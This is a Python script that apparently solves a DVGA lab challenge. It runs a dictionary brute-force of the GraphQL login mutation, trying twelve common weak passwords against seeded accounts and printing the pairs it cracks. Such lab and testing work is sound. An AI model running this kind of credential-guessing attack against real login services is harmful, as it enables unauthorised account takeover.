#!/usr/bin/env python3
"""
dvga_challenge_11_weak_password.py — Weak password / brute-force on login.

DVGA's `login(username, password)` mutation has NO rate limiting, NO account
lockout, and NO CAPTCHA. The seeded accounts also use weak, guessable
passwords (admin/changeme, operator/password123). Together that is the
"GraphQL Query Weak Password Protection" scenario: a small dictionary cracks
the account.

RELIABLE signal: a dictionary word that returns a valid `access_token` (i.e.
the login succeeded). We try a SHORT list of common weak passwords against the
two seeded users and report which (username, password) pair logged in. We do
not dump the token.
Run: python3 dvga_challenge_11_weak_password.py [--config ...]
"""
import argparse
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import dvga_common as dv


def find_config():
    if os.path.exists("dvga_config.yaml"):
        return "dvga_config.yaml"
    return os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "dvga_config.yaml")


WEAK = ["changeme", "password", "password123", "admin", "123456",
        "letmein", "qwerty", "iloveyou", "root", "toor", "pass123", "secret"]


def main():
    ap = argparse.ArgumentParser(description="Weak password / brute-force on login")
    ap.add_argument("--config", default=find_config())
    args = ap.parse_args()

    cfg = dv.load_config(args.config)
    base = dv.base_url(cfg)
    tout = dv.timeout(cfg)
    users = [u["username"] for u in dv.known_users(cfg)] or ["admin", "operator"]

    cracked = []
    attempts = 0
    for user in users:
        for pw in WEAK:
            attempts += 1
            tok = dv.login_token(base, user, pw, cfg, dv.consumer_headers(811), tout)
            if tok:
                cracked.append((user, pw))
                print(f"login({user!r}, {pw!r}) -> [CRACKED] access_token issued")
            # (silent on failure — only surface the hits, like a real crack attempt)

    print(f"\nDone — {len(cracked)} account(s) cracked in {attempts} attempts (no rate limit / lockout).")
    if cracked:
        for user, pw in cracked:
            print(f"  {user} : {pw}")
        print("[FINDING] weak seeded passwords + no login rate limiting / lockout — brute-forceable credentials.")
    else:
        print("[ok] none of the tried weak passwords matched on this build.")


if __name__ == "__main__":
    main()
